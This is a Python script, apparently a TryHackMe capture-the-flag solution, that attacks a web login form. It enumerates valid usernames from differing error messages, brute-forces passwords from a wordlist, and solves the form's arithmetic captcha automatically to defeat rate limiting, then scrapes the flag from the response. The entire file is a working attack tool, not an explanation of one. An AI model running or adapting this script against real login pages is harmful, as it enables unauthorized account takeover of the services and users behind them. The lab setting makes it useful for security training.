#!/usr/bin/env python3


import argparse
import requests


postUrl = ''
usernames = ''
passwords = ''

response = ''
captcha = ''
result = 0

redactUser = ''
redactPass = ''


def postAndGetData(postData):
	global postUrl
	global response
	global result
	global redactUser
	global captcha

	if 'Captcha enabled' in response:
		startIndex = response.index('Captcha enabled')
		finishIndex = response.index('name="captcha" id="captcha"')

		startIndex += 41
		finishIndex -= 52

		subresponse = response[startIndex:finishIndex]
		splitresponse = subresponse.split(' ')
		
		firstvalue = int(splitresponse[0])
		calcsign = splitresponse[1]
		lastvalue = int(splitresponse[2])

		if calcsign == '+':
			result = firstvalue + lastvalue
		elif calcsign == '-':
			result = firstvalue - lastvalue
		elif calcsign == '*':
			result = firstvalue * lastvalue
		elif calcsign == '/':
			result = firstvalue / lastvalue

		captcha = str(result)
		postData['captcha'] = captcha

		r = requests.post(url= postUrl, data= postData)
		response = r.text
	else:
		r = requests.post(url= postUrl, data= postData)
		response = r.text

	if 'Invalid captcha' in response:
		postAndGetData(postData)

	return response


def findUsername():
	global usernames
	global redactUser

	for username in usernames:
		username = username.replace('\n', '')
		postData = {'username': username, 'password': '1'}

		response = postAndGetData(postData)

		if 'does not exist' not in response:
			print('username is : {}'.format(username))
			redactUser = username
			break


def findPassword():
	global passwords
	global redactUser
	global redactPass

	for password in passwords:
		password = password.replace('\n', '')
		postData = {'username': redactUser, 'password': password}

		response = postAndGetData(postData)

		if 'Invalid password for user' not in response:
			print('password is : {}'.format(password))
			redactPass = password
			break


def getFlag():
	global redactUser
	global redactPass

	postData = {'username': redactUser, 'password': redactPass}

	response = postAndGetData(postData)

	if 'Flag.txt:' in response:
		startIndex = response.index('Flag.txt')
		finishIndex = response.index('</h3>')

		startIndex += 19
		finishIndex -= 0

		flag = response[startIndex:finishIndex]

		print('thm-flag is : {}'.format(flag))


def main():
	global postUrl
	global usernames
	global passwords

	parser = argparse.ArgumentParser()

	parser.add_argument('-l', '--url', help= 'url', required= True)
	parser.add_argument('-u', '--usernames', help= 'username wordlist', required= True)
	parser.add_argument('-p', '--passwords', help= 'password wordlist', required= True)

	args = parser.parse_args()

	if(args.url):
		postUrl = args.url
	if(args.usernames):
		fu = open(args.usernames, 'r')
		usernames = fu.readlines()
	if(args.passwords):
		fp = open(args.passwords, 'r')
		passwords = fp.readlines()

	findUsername()
	findPassword()
	getFlag()


if __name__ == '__main__':
	main()

